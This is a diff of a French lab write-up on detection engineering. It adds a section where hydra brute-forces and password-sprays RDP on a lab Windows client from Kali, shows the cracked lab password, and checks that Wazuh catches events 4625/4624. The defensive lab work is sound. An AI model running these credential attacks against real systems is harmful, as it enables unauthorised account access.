@@ -73,12 +73,71 @@ Rule finale :
 **Confirme en production** — alertes reelles pour `labuser` (BloodHound, Case B) et `Administrator` (activite normale). Limitation : le rule ne distingue pas attaquant vs admin legitime.
 
 ---
-## 3 T1110.001/T1110.003 Brute force / password spraying 
+## 3 — T1110.001 / T1110.003 Brute force / Password spraying (RDP)
+ 
+### Pre-requis : activer le RDP sur la cible
+ 
+Le Bureau a distance est **desactive par defaut** sur Windows 10/11, contrairement a SMB qui ne necessite aucune activation prealable. Sur `CLIENT01` (192.168.10.20) :
+ 
+```powershell
+Enable-NetFirewallRule -DisplayGroup "Bureau à distance"   # nom localise FR, pas "Remote Desktop"
+Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -Name "fDenyTSConnections" -Value 0
+Set-NetConnectionProfile -InterfaceIndex <n> -NetworkCategory Private
+Add-LocalGroupMember -Group "Utilisateurs du Bureau à distance" -Member "malek\labuser"
+```
+ 
+Premier essai avec `-DisplayGroup "Remote Desktop"` (nom anglais) a echoue — Windows FR nomme le groupe de regles pare-feu "Bureau à distance". `Get-NetFirewallRule | Select DisplayGroup -Unique` confirme le nom exact a utiliser. Le profil reseau doit aussi etre en **Private** et non **Public**, sinon les regles de pare-feu RDP restent inactives malgre leur statut "Enabled".
+ 
+Verification avant l'attaque :
+```powershell
+nmap -p 3389 --reason 192.168.10.20   # depuis Kali : port 3389 open, reason syn-ack
+```
+ 
+### Attaque — depuis Kali (192.168.10.50)
+ 
+**T1110.001 — Brute force (1 utilisateur, plusieurs mots de passe) :**
+```bash
+hydra -l labuser -P passlist.txt rdp://192.168.10.20 -t 1 -W 3
+```
+*(`-t 1 -W 3` necessaire — le module RDP de Hydra echoue/rate les tentatives avec le parallelisme par defaut, cf. l'avertissement "rdp servers often don't like many connections")*
+ 
+```
+[3389][rdp] host: 192.168.10.20   login: labuser   password: pykers123A
+1 of 1 target successfully completed, 1 valid password found
+```
+ 
+**T1110.003 — Password spraying (plusieurs utilisateurs, 1 mot de passe) :**
+```bash
+hydra -L userlist.txt -p pykers123A rdp://192.168.10.20 -t 1 -W 3
+```
+ 
+for bruteforce
+<img width="627" height="282" alt="image" src="https://github.com/user-attachments/assets/99169650-3282-4c11-bfe3-f525715f8a26" />
+<img width="1481" height="159" alt="image" src="https://github.com/user-attachments/assets/25906ce1-19f0-4a00-94b8-1123fe1a5518" />
+ 
+for password spraying
+<img width="635" height="289" alt="image" src="https://github.com/user-attachments/assets/181b9f93-cdab-4670-ac02-9c0199921093" />
+<img width="1475" height="152" alt="image" src="https://github.com/user-attachments/assets/3ce9b71f-4065-489e-b40f-8b2a36054aaf" />
+ 
+### Detection
+ 
+Pas de regle custom ecrite pour cette section — les echecs et le succes d'authentification RDP sont deja couverts par les regles par defaut de Wazuh sur les evenements Windows standards :
+- **Event 4625** (echec de logon, logon type 10/RemoteInteractive) pour chaque mot de passe incorrect essaye par Hydra.
+- **Event 4624** (succes de logon, logon type 10) pour la tentative finale reussie (`pykers123A`).
+Les deux captures Wazuh ci-dessus confirment que ces evenements remontent correctement depuis `CLIENT01`, aussi bien pour le brute force classique que pour le spraying, sans configuration additionnelle au-dela de l'agent deja en place.
+ 
+**Limitation :** aucun seuil/correlation (ex. "N echecs en X secondes") n'a ete implemente ici — Wazuh affiche les evenements individuels, mais ne les regroupe pas automatiquement en un "incident" de brute force sur un logon Windows comme il le ferait nativement pour SSH. Une regle de correlation par seuil serait l'etape suivante logique pour transformer ce simple logging en vraie detection d'attaque.
+ 
+---
+ 
 ## Recap
-
+ 
 | Technique | ATT&CK | Source | Detecte? | Notes |
 |---|---|---|---|---|
 | Enum utilisateurs basique | T1087.002 | Sysmon EID1 (92039, defaut) | Oui | Match large, faux positifs possibles (`whoami /user`) |
 | BloodHound/PowerView | T1087.002 | Sysmon EID1 (100010/100011) | Ecrit, pas valide live | AMSI a bloque l'execution reelle |
 | Groupes, Case A | T1069.002 | DC 4662 (100012) | Oui | SACL doit etre sur AdminSDHolder, pas Domain Admins |
 | Groupes, Case B (Kali) | T1069.002 | DC 4662 (100012) | Oui | Invisible sans SACL deliberee |
+| Brute force RDP | T1110.001 | Client 4625/4624 (defaut) | Oui | RDP desactive par defaut, a activer manuellement |
+| Password spraying RDP | T1110.003 | Client 4625/4624 (defaut) | Oui | Pas de seuil/correlation — logging brut, pas d'alerte groupee |
+ 
